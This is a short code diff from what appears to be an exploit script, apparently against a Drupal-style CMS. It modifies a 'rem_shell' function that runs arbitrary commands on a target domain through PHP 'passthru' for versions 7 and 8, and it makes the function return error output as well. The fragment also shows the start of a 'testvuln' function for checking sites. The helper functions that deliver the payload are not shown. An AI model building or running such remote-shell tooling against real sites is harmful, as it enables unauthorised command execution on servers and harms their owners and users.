@@ -44,9 +44,9 @@ def get_output(full_response):
 
 def rem_shell(domain, version, cmd):
 	if version == 7:
-		rsp = send_cmd_v7(domain, 'passthru', cmd)
+		rsp = send_cmd_v7(domain, 'passthru', cmd+' 2>&1')
 	if version == 8:
-		rsp = send_cmd_v8(domain, 'passthru', cmd)
+		rsp = send_cmd_v8(domain, 'passthru', cmd+' 2>&1')
 	return get_output(rsp)
 
 def testvuln(site):
